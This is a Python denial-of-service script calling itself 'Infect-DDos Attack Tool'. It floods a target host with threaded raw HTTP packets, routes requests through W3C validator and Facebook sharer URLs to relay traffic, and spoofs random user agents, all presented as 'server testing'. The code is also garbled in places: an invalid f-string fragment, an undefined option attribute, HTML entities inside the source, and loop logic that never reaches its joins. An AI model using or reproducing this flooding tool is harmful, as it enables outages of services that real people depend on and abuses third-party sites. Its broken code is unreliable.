#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

def user_agent():
    global uagent
    uagent = []
    
    for i in range(200):
        uagent.append(f"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/{random.randint(300, 500)}.420+Naive/1.2.{10} iPad")
        uagent.append(f"Mozilla/5.0 ({random.random()}) KHTML, like Gecko, (KHTML, like Gecko) (en) Version/100.0 Safari/100000")
        uagent.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.0 Safari/537.36")
        uagent.append(f"Mozilla/5.0 (compatible; AWS ELB; +http://www.amazonaws.com/2012-02-01/AmazonEC2-User-Agent/)")
        # more user agents can be added here

def my_bots():
    global bots
    bots = []
    
    for i in range(150):
        bots.append(f"http://validator.w3.org/check?uri={i}")
        bots.append(f"http://www.facebook.com/sharer/sharer.php?u={i}")
    return bots

def infecting(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
            global address
            print(f"\033[94m{address} \033[0m")
            time.sleep(.05)
    except:
        time.sleep(.1)

def infect_it(item):
    try:
        while True:
            packet = str(f"GET {address} HTTP/1.1\nHost: &amp;_&amp;+\n\n{splus hairst.encode('utf-8')}\n User-Agent: {random.choice(uagent)}\n").encode('utf8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((address, int(port)))
            if s.sendto(packet, (address, int(port))):
                s.shutdown(1)
                print(f"\033[92m {time.ctime(time.time())} &lt;--packet sent! infecting--&gt;\033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut&lt;-&gt;down \033[0m")
            time.sleep(0.05)
    except socket.error as e:
        print(f"\033[91mno connection! server maybe down \033[0m")
        # print('\033[91m', e, '\033[0m')
        time.sleep(.1)

def dos():
    while True:
        item = q.get()
        infect_it(item)
        q.task_done()

def dos2():
    while True:
        item = w.get()
        infecting(random.choice(bots) + "http://" + address)
        w.task_done()

def usage():
    print(
        ''' \033[92m Infect-DDos Attack Tool v.1.1 
1.1 
It is just for server testing script. Your ip is visible. 
1.1
usage : python3 hammer.py [-s] [-p] [-t]
-h : help
-s : server ip
-p : port default 80
-t : turbo default 135 
1.1
1.1
1.1 
''')
    sys.exit()

def get_parameters():
    global address
    global port
    global thro
    global item
    # 
    optp = OptionParser(add_help_option=False, epilog="Hammers")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const",
                   dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="address", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="default 135 -t 135")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.address is not None:
        address = opts.address
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.thro is None:
        thro = 135
    else:
        thro = opts.turbo

# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
# task queue are q, w
q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()

    print(f"\033[94m[!] Infect-DDos Attack Tool v1.1\033[0m")
    print(f"\033[92m[+] Starting as:\033[0m {threading.currentThread().name}")
    print(f"\033[91m[!] Address: \033[0m {address}")
    print(f"\033[92m[+] Port: \033[0m {port}")
    print(f"\033[92m[+] Turbo speed: \033[0m {thro} requests/second")

    user_agent() # generate a list of random user agents
    my_bots()

    start = time.time()
    time.sleep(5)

    while True:
        for i in range(int(thro)):
            t = threading.Thread(target=dos)
            t.daemon = True  # if thread is exist, it dies
            t.start()
            t2 = threading.Thread(target=dos2)
            t2.daemon = True  # if thread is exist, it dies
            t2.start()

        # tasking
        item = 0
        while True:
            if (item > 1250):
                item = 0
                time.sleep(0.05)
            item = item + 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()
